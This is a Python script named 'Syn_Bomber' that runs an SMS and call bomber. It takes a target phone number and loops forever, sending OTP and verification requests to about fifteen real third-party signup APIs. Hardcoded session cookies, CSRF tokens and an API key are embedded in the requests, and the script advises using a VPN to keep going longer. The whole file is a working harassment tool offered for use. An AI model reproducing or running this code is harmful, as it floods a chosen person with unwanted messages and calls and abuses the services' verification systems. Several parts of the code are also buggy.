import requests, datetime, random, sys, os, time


country_codes = {
    '93': 'AF',
    '355': 'AL',
    '213': 'DZ',
    '376': 'AD',
    '244': 'AO',
    '672': 'AQ',
    '54': 'AR',
    '374': 'AM',
    '297': 'AW',
    '61': 'AU',
    '43': 'AT',
    '994': 'AZ',
    '973': 'BH',
    '880': 'BD',
    '375': 'BY',
    '32': 'BE',
    '501': 'BZ',
    '229': 'BJ',
    '975': 'BT',
    '591': 'BO',
    '387': 'BA',
    '267': 'BW',
    '55': 'BR',
    '246': 'IO',
    '673': 'BN',
    '359': 'BG',
    '226': 'BF',
    '257': 'BI',
    '855': 'KH',
    '237': 'CM',
    '238': 'CV',
    '236': 'CF',
    '235': 'TD',
    '56': 'CL',
    '86': 'CN',
    '57': 'CO',
    '269': 'KM',
    '682': 'CK',
    '506': 'CR',
    '385': 'HR',
    '53': 'CU',
    '599': 'AN',
    '357': 'CY',
    '420': 'CZ',
    '243': 'CD',
    '45': 'DK',
    '253': 'DJ',
    '670': 'TL',
    '593': 'EC',
    '20': 'EG',
    '503': 'SV',
    '240': 'GQ',
    '291': 'ER',
    '372': 'EE',
    '251': 'ET',
    '500': 'FK',
    '298': 'FO',
    '679': 'FJ',
    '358': 'FI',
    '33': 'FR',
    '689': 'PF',
    '241': 'GA',
    '220': 'GM',
    '995': 'GE',
    '49': 'DE',
    '233': 'GH',
    '350': 'GI',
    '30': 'GR',
    '299': 'GL',
    '502': 'GT',
    '224': 'GN',
    '245': 'GW',
    '592': 'GY',
    '509': 'HT',
    '504': 'HN',
    '852': 'HK',
    '36': 'HU',
    '354': 'IS',
    '91': 'IN',
    '62': 'ID',
    '98': 'IR',
    '964': 'IQ',
    '353': 'IE',
    '972': 'IL',
    '39': 'IT',
    '225': 'CI',
    '1' : 'JA',
    '81': 'JP',
    '962': 'JO',
    '254': 'KE',
    '686': 'KI',
    '383': 'XK',
    '965': 'KW',
    '996': 'KG',
    '856': 'LA',
    '371': 'LV',
    '961': 'LB',
    '266': 'LS',
    '231': 'LR',
    '218': 'LY',
    '423': 'LI',
    '370': 'LT',
    '352': 'LU',
    '853': 'MO',
    '389': 'MK',
    '261': 'MG',
    '265': 'MW',
    '60': 'MY',
    '960': 'MV',
    '223': 'ML',
    '356': 'MT',
    '692': 'MH',
    '222': 'MR',
    '230': 'MU',
    '262': 'RE',
    '52': 'MX',
    '691': 'FM',
    '373': 'MD',
    '377': 'MC',
    '976': 'MN',
    '382': 'ME',
    '212': 'EH',
    '258': 'MZ',
    '95': 'MM',
    '264': 'NA',
    '674': 'NR',
    '977': 'NP',
    '31': 'NL',
    '687': 'NC',
    '64': 'NZ',
    '505': 'NI',
    '227': 'NE',
    '234': 'NG',
    '683': 'NU',
    '850': 'KP',
    '47': 'SJ',
    '968': 'OM',
    '92': 'PK',
    '680': 'PW',
    '970': 'PS',
    '507': 'PA',
    '675': 'PG',
    '595': 'PY',
    '51': 'PE',
    '63': 'PH',
    '48': 'PL',
    '351': 'PT',
    '974': 'QA',
    '242': 'CG',
    '40': 'RO',
    '7': 'RU',
    '250': 'RW',
    '590': 'MF',
    '290': 'SH',
    '508': 'PM',
    '685': 'WS',
    '378': 'SM',
    '239': 'ST',
    '966': 'SA',
    '221': 'SN',
    '381': 'RS',
    '248': 'SC',
    '232': 'SL',
    '65': 'SG',
    '421': 'SK',
    '386': 'SI',
    '677': 'SB',
    '252': 'SO',
    '27': 'ZA',
    '82': 'KR',
    '211': 'SS',
    '34': 'ES',
    '94': 'LK',
    '249': 'SD',
    '597': 'SR',
    '268': 'SZ',
    '46': 'SE',
    '41': 'CH',
    '963': 'SY',
    '886': 'TW',
    '992': 'TJ',
    '255': 'TZ',
    '66': 'TH',
    '228': 'TG',
    '690': 'TK',
    '676': 'TO',
    '216': 'TN',
    '90': 'TR',
    '993': 'TM',
    '688': 'TV',
    '256': 'UG',
    '380': 'UA',
    '971': 'AE',
    '44': 'GB',
    '1': 'US',
    '598': 'UY',
    '998': 'UZ',
    '678': 'VU',
    '379': 'VA',
    '58': 'VE',
    '84': 'VN',
    '681': 'WF',
    '967': 'YE',
    '260': 'ZM',
    '263': 'ZW'
}

colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
W='\033[0m'
def switch_color():
    print(random.choice(colors))
    

##Headers
headers = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    },
]


def random_useragent():
    random.choice(headers)
    return

ranheaders = random_useragent()


def connecterrror():
    try:
        requests.get('http://google.com', headers=ranheaders)
        try:
            requests.get('http://google.com', headers=ranheaders)
        except:
            pass
    except Exception:
        res = True
        if res:
            print("Please connect to the internet!")
            print("\nSyn_Bomber will be closing.\n")
            quit()


senttime = datetime.datetime.now().strftime("%c")


def areacodes():
    for i in country_codes:
        x = ""
        f = x + " "
        print(x, "\n", "                      ",i, end=" | ")
        print(country_codes[i])
        print("                 ^^^^^^^^^^^^^^^^^^^^^^^^^             ")
        print("           Above is the Area code of a country")


try:
    choiceforareacode = input("Do you want a list of area codes[y/n]? ")
    if choiceforareacode == 'y':
        areacodes()
    elif choiceforareacode == 'n':
        pass
    else:
        print("[*] Unexpected input!")
        exit()
    
    countrycode = input("Enter Area code without '+' : ")
    if '+' in countrycode or ' ' in countrycode:
        a = list(countrycode)
        a.remove('+')
        countrycode = ''.join(a)
        countrycode = countrycode.strip()
        print("[*] ALL excessive characters were removed successfully!")
    else:
        print("[*] Correct Format!")
    rus = input("Are you robot? [y/n] ")
    if rus == 'y':
        if countrycode == '7':
            try:
                import RU
            except:
                ImportError("[*] The Russian Module Wasn't Imported Successfully,\n PLEASE TRY AGAIN! [*]")
        else:
            pass
    elif rus == 'n':
        print("[*] Do not abuse this service!")
        pass
except:
    pass

try:
    phone = input("Enter phone number: ")
    if len(phone) >= 6:
        phone = str(phone)
    elif len(phone) <= 5:
        print("[*] Phone numbers are not normally that short!\n")
        print("[*] And aren't letters either!")
        quit()
    else:
        print("[*] Incorrect number/format!")

    if ' ' in phone:
        a = list(phone)
        a.remove(' ')
        phone = ''.join(a)
        phone = phone.strip()
        print("[*] All unwanted spaces were removed successfully!!!\n")
        if '(' in phone:
            a = list(phone)
            a.remove('(')
            phone = ''.join(a)
            phone = phone.strip()
            print("[*] The \'(\' was removed successfully!!!\n")
            if ')' in phone:
                a = list(phone)
                a.remove(')')
                phone = ''.join(a)
                phone = phone.strip()
                print("[*] The \')\' was removed successfully!!!\n")
                if '-' in phone:
                    a = list(phone)
                    a.remove('-')
                    phone = ''.join(a)
                    phone = phone.strip()
                    print("[*] The \'-\' was removed successfully!!!\n")
                    if '_' in phone:
                        a = list(phone)
                        a.remove('_')
                        phone = ''.join(a)
                        phone = phone.strip()
                        print("[*] The \'_\' was removed successfully!!!\n")
                    else:
                        pass
except:
    pass



print("[*] b - Bomb")
print("[*] q - quit")
options = input("Which do you want : ")
if options == 'b':
    print("The sms bomber has been initiated!!!")
    print("The call bomber has been initiated!!!")
elif options == 'q':
    print("The Fun Ends!!!")
    quit()
else:
    print("Inalid!")

smssent = 0
smsfail = 0
callsent = 0
callfail = 0
connecterrror()
countrycode = str(countrycode)
phone = str(phone)
print("\nUse a VPN for a longer use with bomber.\n")
while True:    
    try:
        headers = {
            'X-API-KEY' : 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI2Nzg1MzYiLCJjb3VudHJ5X2NvZGUiOiI3IiwicGxhdGZvcm0iOiJ3ZWIiLCJleHAiOjE2MDAxMDE2MDc5MjF9.X7r_La9KRF1AEVvqGm9Iw5SrTJn_hnOFgmJffuP9gWw',
            'User-Agent': ranheaders,
            'Accept': '*/*',
        }
        data = {
            "phone_number" : phone,
            "country_code" : countrycode,
            "platform" : "web",
            }

        response = requests.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ROW', headers=headers, json=data)
        a = bytes("ok", 'utf-8')
        if a in response.content:
            smssent += 1
            print("[*] - SMS SENT!")
        else:
            smsfail += 1
            print("[*] - SMS FAILED TO BE SENT!")
    except:
        res = True
        if res:
            print("[*] E - SMS FAILED TO BE SENT!")


    try:
        headers = {
            'User-Agent': ranheaders,
            'Accept': '*/*',
        }
        phone = countrycode + phone
        data = {"reqId":"63896-1600060671","params":{"phone":phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
        url = ('https://u.icq.net/api/v16/rapi/auth/sendCode')
        response = requests.post(url, json=data, headers=headers)
        a = bytes("20000", 'utf-8')
        if a in response.content:
            smssent += 1
            print("[*] - SMS SENT!")
        else:
            smsfail += 1
            print("[*] - SMS FAILED TO BE SENT!")
    except:
        res = True
        if res:
            print("[*] E - SMS FAILED TO BE SENT!")


    try:
        headers = {
            'User-Agent': ranheaders,
            'Accept': '*/*',
        }
        url = ('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?phone=+' + countrycode + phone + '&callmode=1&oper=9')
        response = requests.get(url, headers=headers)
        a = bytes("success", 'utf-8')
        if a in response.content:
            smssent += 1
            print("[*] - SMS SENT!")
        else:
            smsfail += 1
            print("[*] - SMS FAILED TO BE SENT!")
    except:
        res = True
        if res:
            print("[*] E - SMS FAILED TO BE SENT!")


    try:
        headers = {
            'User-Agent': ranheaders,
            'Accept': '*/*',
        }
        url = ('https://suandshi.ru/mobile_api/register_mobile_user?phone=' + countrycode + phone)
        response = requests.get(url, headers=headers)
        a = bytes("success", 'utf-8')
        if a in response.content:
            smssent += 1
            print("[*] - SMS SENT!")
        else:
            smsfail += 1
            print("[*] - SMS FAILED TO BE SENT!")
    except:
        res = True
        if res:
            print("[*] E - SMS FAILED TO BE SENT!")


    try:
        headers = {
            'Cookie' : '_ga=GA1.2.172274467.1600052700; _gid=GA1.2.288019732.1600052700; _fbp=fb.1.1600052703743.1756448194; _hjid=fdb9deab-f2b6-4b74-b808-27754aeecfe1; _hjAbsoluteSessionInProgress=0',
            'User-Agent': ranheaders,
            'Accept': '*/*',
        }
        url = ('https://my.hmara.tv/api/sign?contact=' + countrycode + phone + '&deviceId=f4a57e9c-1324-4bdc-9a7c-4c6e4d4f779a&language=en&profileId=1&deviceType=2&ver=2.2.9')
        response = requests.get(url, headers=headers)
        a = bytes("remain", 'utf-8')
        if a in response.content:
            smssent += 1
            print("[*] - SMS SENT!")
        else:
            smsfail += 1
            print("[*] - SMS FAILED TO BE SENT!")
    except:
        res = True
        if res:
            print("[*] E - SMS FAILED TO BE SENT!")


    try:
        headers = {
            'User-Agent': ranheaders,
            'Accept': '*/*',
	    }
        url = ('https://secure.online.ua/ajax/check_phone/?reg_phone=' + countrycode + phone)
        response = requests.get(url, headers=headers)
        if 'fail' in response.content:
            smsfail += 1
            print("[*] - SMS FAILED TO BE SENT!")
        else:
            smssent += 1
            print("[*] - SMS SENT!")
    
    except:
        res = True
        if res:
            print("[*] E - SMS FAILED TO BE SENT!")


    try:

        headers = {
            "Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8",
            'Accept': '*/*',
        }
        
        data = {
            'ts' : 'TglfxnrQiGQ',
            'sign' : 'ecb4b0fd082bd441',
            'app_version' : '870',
            'session' : '55af31477394108673754849_1615851023-0OHM7GktTtvjKJv99kyJjkA',
            }
        phone = countrycode + phone
        data['phone'] = phone

        response = requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', headers=headers, data=data)
        a = bytes("success", 'utf-8')
        if a in response.content:
            smssent += 1
            print("[*] - SMS SENT!")
        else:
            smsfail += 1
            print("[*] - SMS FAILED TO BE SENT!")
    except:
        res = True
        if res:
            print("[*] E - SMS FAILED TO BE SENT!")



    try:
        headers = {
            'User-Agent': ranheaders,
            'Accept': '*/*',
        }
        data = {
            'phone' : countrycode + phone,
            }
        response = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', headers=headers, json=data)
        a = bytes("ok", 'utf-8')
        if a in response.content:
            smssent += 1
            print("[*] - SMS SENT!")
        else:
            smsfail += 1
            print("[*] - SMS SENT!")
    except:
        res = True
        if res:
            print("[*] E - SMS FAILED TO BE SENT!")



    try:
        headers = {
        'cookie' : '_ga=GA1.2.1940349855.1600043340; _gid=GA1.2.504218028.1600043340; _ym_uid=16000433421060585935; _ym_d=1600043342; _ym_isad=2; _fbp=fb.1.1600043346200.1079542524; tmr_lvid=a0f3690601ad4556d688726823f6db50; tmr_lvidTS=1600043352969; client-id=04362b59-88d7-4a02-a5fd-ecb9aeb09958; _ym_visorc_44830798=w; _ym_visorc_50124454=w; tmr_detect=0%7C1600111660992; tmr_reqNum=39; _dc_gtm_UA-100141486-1=1; _gali=wizard-next-button; _dc_gtm_UA-100141486-2=1; _dc_gtm_UA-100141486-25=1; ROUTEID=738febe4efb15c5f|X1/HY; qpay-web/3.0_csrf-token-v2=111ec9e20344f5153975aa06b9cd1b0d',
        "Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8",
        'User-Agent': ranheaders,
        'accept' : 'application/vnd.cft-data.v2.46+json',
        'x-csrf-token' : '111ec9e20344f5153975aa06b9cd1b0d',
        'x-application' : 'Qpay-Web/3.0',
    }
        data = {}
        data['phone'] = (countrycode + phone)
        response = requests.post('https://koronapay.com/transfers/online/api/users/otps', json=data, headers=headers)
        a = bytes("timeToLive", 'utf-8')
        if a in response.content:
            smssent += 1
            print("[*] - SMS SENT!")
        else:
            smsfail += 1
            print("[*] - SMS FAILED TO BE SENT!")
    except:
        res = True
        if res:
            print("[*] E - SMS FAILED TO BE SENT!")

    try:
        headers = {
                'referer' : 'https://www.realestateindia.com/registration.php',
            'content-type' : 'application/x-www-form-urlencoded; charset=UTF-8',
            'cookie' : 'name=5fa691jhhn9h4eue5u092q4pv1; _ga=GA1.2.163495898.1600034069; _gid=GA1.2.1510437790.1600034069; __utma=188917800.163495898.1600034069.1600034070.1600034070.1; __utmc=188917800; __utmz=188917800.1600034070.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt_UA-16625285-5=1; __utmb=188917800.2.10.1600034070; _fbp=fb.1.1600034079289.1911776129',
            'User-Agent': ranheaders,
            'Accept': '*/*',
        }

        data = {
                'action_id' : 'call_to_otp',
            }
        data["mob_number"] = countrycode + phone

        response = requests.post('https://www.realestateindia.com/member-registration-process.php?sid=0.577941943901308', headers=headers, data=data)
        a = bytes("\n", 'utf-8')
        if a in response.content:
                callsent += 1
                print("[*] - CALL SENT!")
        else:
                callfail += 1
                print("[*] - CALL FAILED TO BE SENT!")
    except:
        res = True
        if res:
            print("[*] E - CALL FAILED TO BE SENT!")


    try:
        headers = {
            "Content-Type" : "application/json",
            "Cookie" : 'T=TI159992832337300256196730498814789729059007389217312862613184953699; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; s_cc=true; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18518%7CMCMID%7C88901476717731542762288373456521522817%7CMCAID%7CNONE%7CMCOPTOUT-1599935561s%7CNONE%7CMCAAMLH-1600533158%7C7%7CMCAAMB-1600533161%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI; S=d1t12QEQDPz8/KE4rPzEkPz8/P2+ntaDK+X9xU+lG65Hr/xXr1Uj5TyXLqLeAfixXWqeCfO9fTAgfHfzz29l3wWtuVg==; SN=VIE7CC0CD4C495442B8BDCD04DE1F039FD.TOK927EB847B0CC41B694D19DF7C1119BFF.1600037602.LO; s_sq=flipkart-prd%3D%2526pid%253Dwww.flipkart.com%25253A%2526pidt%253D1%2526oid%253DCONTINUE%2526oidt%253D3%2526ot%253DSUBMIT',
            'User-Agent': ranheaders,
            'Accept': '*/*',
        }
        data = {
            'supportAllStates' : 'true'
            }
        data['loginId'] = ("[\"", "+", countrycode, phone, "\"]")
        response = requests.post('https://1.rome.api.flipkart.com/api/6/user/signup/status', headers=headers, data=data)
        a = bytes("sent", 'utf-8')
        if a in response.content:
            smssent += 1
            print("[*] - CALL SENT!")
        else:
            smsfail += 1
            print("[*] - CALL FAILED TO BE SENT!")
    except:
        res = True
        if res:
            print("[*] E - CALL FAILED TO BE SENT!")


    try:
        headers = {
            'User-Agent': ranheaders,
            'Accept': '*/*',
	    }

        url = ('https://www.oyorooms.com/api/pwa/generateotp?phone=' + phone + '&country_code=' + countrycode + '&nod=4&locale=en')
        
        response = requests.get(url, headers=headers)
        if "OTP sent" in response.content:
            smssent += 1
            print("[*] - CALL SENT!")
        else:
            smsfail += 1
            print("[*] - CALL FAILED TO BE SENT!")
    except:
        res = True
        if res:
            print("[*] E - CALL FAILED TO BE SENT!")

        

    try:
        if len(phone) >= 11:
                a = list(phone)
                a.remove([0])
                phone = ''.join(a)
                phone = phone.strip()
        else:
                pass
        headers = {
            'content-type' : 'application/json',
            'cookie' : 'bm_sz=7922D28A12CF3CDC76DC46CA688F4C36~YAAQX+4hFyxu3nB0AQAAZmxciQk6tNQvQrcJZRss+vUWPt+b8iSpruS7AeL6wDRTthKKpUJJ+wlCzT0c+8xEjkMB03BhIH8zRFPedMWjcms7BVDFhQHCq2GQP50BbK4u0IzRKyfBjTxfqkY50GqXNX+1R+NqUOBl5+LROWMT7rnsHwsnawa/GIdXzms=; laquesis=pan-37312@a#pan-38167@b#pan-38189@a#pan-40730@c#pan-41133@b#pan-42113@b#pan-42275@a#pan-43738@a#pan-44625@a; laquesisff=pan-36788#pan-38000#pan-42665; bm_mi=3BE102758020CD3D3553669578C12CCC~adNC2HJ487yo8ufkq1pj4znaPizR2MG5Wdtuuvl5MAKosDv/mOigbywMgFAAhtJ7FXEelltwrvSZj9LVSHE4Jth6G3gZiSQjDtkJ4HisVFl+E1IVPO3L322quU5cJV0MnAPq3E1vlSdnzpJNkwv6BTKwD/YJP4pxyPHEUQFmUWGfnXL0tHRTnMYucvD1oD7QLLEwuA+FJIDph9A2a3GZ8eSCsDDz/k6LOKTczBl7O3XMIWCFHtZgs/WS6kxszJ6mnE/BB4A3BEvBTV1Vpi7+pg==; ak_bmsc=99B17B6DA2DFEFBF358909F6F7D76B9D1721EE5F98450000718E5E5FFA631B52~plnOGHz1bc/Ern7egJQX3LJyGyPQWc16EB+zEeSgnZdYeMRG12lDGtb6oJY+V4zJOao/p8GGimkvEquuuTIAR5hOmLZurq6nXe35VCBIg4aHquV4Zb5wUqFKGuJLGI93nH31o2SPAOMCpve8zKOwstn1kkdJqUVTyF4RG19TqxWpbIkSMR2IkfXh7JKJY3ExcDg/PW8pehWkmsm/ygVrkIxjIntdoOxldbCNhnYmkB5HWqtTpVxufgYUUfE4VEogTg; _abck=0FE2916022D57AD5A41A3808E8E22291~0~YAAQX+4hFw9w3nB0AQAAioRdiQRX4W+As9yylv+nqnpGP3JM79KmbfkX/LhNRkvU+/fg9hgsQyEdAJaQk2c2mnwsN0RSnSiL3XJi2RftuJxNk78vWgMzxzjTRP2pB2InnThUMi/hCFfZEBQDBnSYRrK+3JPTVn5FmniuBDlyTRjeZDxGtcW8TdCi50NTE2/RHnPMfRe9gMK7wZOBtQqHgrx9mAZ8vatEErt9xOYpoVfoJXP70jbfhuJI1MX757Tblm3zR/iHhyW711HNU8V4CH4NTsuAaIsJW9LPz/f+tynltZSY8fOk41N2G42ZXeI1k1ro~-1~||-1||~-1; g_state={"i_p":1600039677756,"i_l":1}; ldTd=true; lqstatus=1600033596|174895e1814x60fda136|pan-42275; bm_sv=0EDE8F0F4FB0919D1ED365A51FE94820~kWdLk8kTLCmrgZqY1eFMWsw6IcdA5FSNSZ2keQR1uM/wj3X8mIUCwRnRyBzwolOT/hWiXrluq56qCdTtTO63kOTR2ot+waaGVeagh4noq92jVBK2tzx3N1M7Ifo6uNrTfauuzqtxMNmkofImyPsOr60SNSxu+yJDvBM6VKBMOoQ=; _ga=GA1.2.2113613141.1600032498; _gid=GA1.2.711598127.1600032498; _gat_UA-88236416-1=1; _gat_clientNinja=1; onap=174895e1814x60fda136-1-174895e1814x60fda136-15-1600034414',
            'x-panamera-fingerprint' : 'acb0fd2ea787a809a8f8fc131b8556ad#1600032453669',
            'User-Agent': ranheaders,
            'Accept': '*/*',
        }

        data = {
            "grantType" : "phone",
            }
        data["phone"] = countrycode + phone

        response = requests.post('https://www.olx.in/api/auth/authenticate?lang=en', headers=headers, data=data)
        a = bytes("success", 'utf-8')
        if a in response.content:
            callsent += 1
            print("[*] - CALL SENT!")
        else:
            callfail += 1
            print("[*] - CALL FAILED TO BE SENT!")
    except:
        res = True
        if res:
            print("[*] E - CALL FAILED TO BE SENT!")
    
                
    try:
        headers = {
            'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding' : 'gzip, deflate, br',
            'Accept-Language' : 'en-US,en;q=0.9',
            'Cookie' : 'JSESSIONID=7E42685DD7C7C7A269B5871042765747.MBAPI232; JSESSIONID=4031D72118DC490693CE59A6ABF86EB0-n2.MBAPP-180; _ga=GA1.2.1278592692.1600030378; _gid=GA1.2.682381484.1600030378; PgPlotRedirection=Y; HDSESSIONID=707a2fb1-105b-4ccf-918e-98718a35df8b; _col_uuid=e16cf34f-36f7-4e21-abad-3c6760bea182-10w5c; _fbp=fb.1.1600030397029.329984266; mbNps=Y',
            'Upgrade-Insecure-Requests' : 1,
            'User-Agent' : ranheaders,
            }

        
        url = ("https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=" + phone)

        response = requests.post(url, headers=headers)
        a = bytes("attempt exceeded", 'utf-8')
        if a in response.content:
            callfail += 1
            print("[*] - CALL FAILED TO BE SENT!")
        else:
            callsent += 1
            print("[*] - CALL SENT!")
    except:
        res = True
        if res:
            print("[*] E - CALL FAILED TO BE SENT!")
            

            
    try:
        headers = {
            'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding' : 'gzip, deflate, br',
            'Accept-Language' : 'en-US,en;q=0.9',
            'Cookie' : '__cfduid=d11b0f7ce46f46293a109e380ebbb21251600028138; _ga=GA1.2.59818490.1600028165; _gid=GA1.2.22868743.1600028165; _fbp=fb.1.1600028177706.1563766127; g_state={"i_p":1600035456403,"i_l":1}; amplitude_id_099646e3b8c781f93706aea2051cc6b9myupchar.com=eyJkZXZpY2VJZCI6IjNjNzU3OTY1LWZiZmYtNGZmMy1iMWQzLWZmZmFhMzNlYzEwOFIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYwMDAyODE2NDM0MSwibGFzdEV2ZW50VGltZSI6MTYwMDAyODQ1MTUxNywiZXZlbnRJZCI6MCwiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjB9; utm_refrer_myupchar=https%3A%2F%2Fwww.myupchar.com%2Fusers%2Fsign_up; _marketplace_session=MHFrYy94cDBUbE5IRk5XV1JpZ2JCNy92NVIvTEQrSGZkeGRrcGs0SDdpWE9qSGVMeHNCRjZWRVUzQSt2ektrYVpFUzJINllqV2hrdjFwbEhDVGRKZ0lmNFBrdXRxV0J1WGowMk5mNlZzYm94TWUzUlY2VkE2RzBwUlM2aUIzRm1ac2YvYlhDNm9pd084R1dwN2dzNUxsdjRLUmN6QWRzeW9EK0tKSG5NSXpoT0c5b0dnNDlUaEpvRFRFR005MGhoVnR4SG9rNHpPczBJdTUzS0ZmbnIvRmtsSDVjMFdxRXBjY205cThZTVE4UXhLc3NxVlRjdE1qQWg2RVNzSGd3ZC0tODdSR2RwQ3VzVzFxVVNxMlBTNENiQT09--7eaf0320866d1740a4a3eef7c0efc446719fcf4b; __cf_bm=185de2e8216c288591c42d2b3d762b8dcc5a3f9c-1600029296-1800-AWXAoLmsjjSQvk1FSXGWGKB40bEwxi0QDwDzn1DmJw9n4Adj/6zcjwOLMvOUUEqQcpx9Dsr7a63ZVG1yTJyCEww=',
            'Upgrade-Insecure-Requests' : 1,
            'User-Agent' : ranheaders,
            }

        
        url = ("https://www.myupchar.com/registrations/store_otp?phone=" + phone)

        response = requests.post(url, headers=headers)
        a = bytes("sent successfully", 'utf-8')
        if a in response.content:
            callsent += 1
            print("[*] - CALL SENT!")
        else:
            callfail += 1
            print("[*] - CALL FAILED TO BE SENT!")
    except:
        res = True
        if res:
            print("[*] E - CALL FAILED TO BE SENT!")
            

    
    try:
        headers = {
            'User-Agent': ranheaders,
            'Accept': '*/*',
	    }

        url = ('https://findclone.ru/register?phone=' + countrycode + phone)
        
        response = requests.get(url, headers=headers)
        a = bytes("session", 'utf-8')
        if a in response.content:
            smssent += 1
            print("[*] - CALL SENT!")
        else:
            smsfail += 1
            print("[*] - CALL FAILED TO BE SENT!")
    except:
        res = True
        if res:
            print("[*] E - CALL FAILED TO BE SENT!")


print("\nAll sms and call bombing details are stored in log.txt")
log = open('log.txt', 'a+')
phone = countrycode + phone
print("===============================================\n", "Log for ", senttime, "\nTarget: ", phone, "\nAmount of sms sent : ", smssent, "\nAmount of sms failed : ", smsfail, "\nAmount of calls made successfully: ", callsent, "\nAmount of unsuccessful calls: ", callfail, "\nCoded by 1Syntaxxx1", "\n===============================================\n", file=log)
log.close()
